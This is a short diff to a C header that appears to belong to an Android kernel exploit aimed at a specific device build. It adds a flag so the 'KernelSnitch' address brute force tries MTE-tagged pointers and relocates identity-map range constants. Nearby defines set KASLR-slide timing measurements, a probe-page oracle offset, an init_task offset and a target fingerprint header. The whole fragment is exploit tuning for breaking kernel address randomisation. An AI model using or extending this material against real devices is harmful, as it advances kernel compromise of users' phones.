@@ -64,6 +64,9 @@
 #define ROUTE_WAIT_SECONDS 8
 #define PSELECT_ENTER_DELAY_USEC 50000
 #define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
+/* GKI 6.1 ships KASAN_HW_TAGS: kernel pointers are MTE-tagged, so the
+ * KernelSnitch mm_struct brute force must try the tagged addresses. */
+#define KERNELSNITCH_MTE 1
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
@@ -87,11 +90,11 @@
 /* Probe page: the linear alias of the image page holding the global.
  * probe_alias = 0xffffff8000000000 + (P0_SLIDE_GLOBAL_OFF & ~0xfff). */
 #define P0_ORACLE_PROBE_OFFSET (P0_SLIDE_GLOBAL_OFF & ~0xfffULL)
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
 #define P0_FINGERPRINT_HEADER \
   "targets/panther-BP3A.250905.014/p0_fingerprint.h"
 #endif
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define INIT_TASK_OFF 0x01fef600ULL
